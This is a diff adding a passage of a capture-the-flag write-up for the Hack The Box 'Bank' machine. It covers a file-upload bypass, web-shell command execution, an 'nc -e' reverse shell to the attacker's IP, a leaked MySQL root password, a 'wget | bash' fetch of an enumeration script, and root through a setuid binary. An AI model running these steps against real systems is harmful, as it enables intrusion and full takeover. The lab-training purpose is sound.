@@ -165,3 +165,54 @@ Balance: 8842803 .
 When trying this credentials on the login page we get logged in.
 
 There is a _Support_ page where we can upload files.
+
+![Bank support page](https://kyuu-ji.github.io/htb-write-up/bank/bank_support-2.png)
+
+The page allows images but doesn't allow PHP files to be uploaded. Looking at the source we see a comment that says:
+> [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG]
+
+So lets change the extension of our file to _.htb_ instead.
+
+![File upload](https://kyuu-ji.github.io/htb-write-up/bank/bank_file-upload.png)
+
+We see the uploaded files in the web page now and can click on the attachment to browse to that file. Now we can execute commands:
+```markdown
+http://bank.htb/uploads/logo.htb?cmd=whoami
+```
+
+This gives us the output that we are _www-data_. Lets start a reverse shell with this command execution.
+```markdown
+http://bank.htb/uploads/logo.htb?cmd=nc%20-e%20/bin/sh%2010.10.14.23%209001
+```
+
+After a short while the the request gets sent to my listener that waits for connections on my IP and port 9001 and we started a reverse shell as www-data!
+
+## Privilege Escalation
+
+When looking at the PHP files from the server, we find credentials for MySQL in the file **/var/www/bank/inc/user.php**:
+```markdown
+# (...)
+function getUsername($email){
+                $mysql = new mysqli("localhost", "root", "!@#S3cur3P4ssw0rd!@#", "htbbank");
+                $email = $mysql->real_escape_string($email);
+                $result = $mysql->query("SELECT * FROM users WHERE email = '$email'");
+                $row = $result->fetch_assoc();
+                return $row['username'];
+# (...)
+```
+
+We can login into MySQL but don't find anything important can starting a shell from there won't give us a root shell:
+```markdown
+mysql -u root -p
+
+
+mysql> \! /bin/sh
+```
+
+The password won't work on the _chris_ nor the _root_ user, so we will execute any Linux enumeration script to get an attack surface.
+```markdown
+wget http://10.10.14.23/LinEnum.sh | bash
+```
+
+Looking at the results we see that there is a _setuid bit_ set on the **/var/htb/bin/emergency** binary that is not a default Linux binary.
+When executing this, we drop into a shell with the effective user ID of root and finished the box!
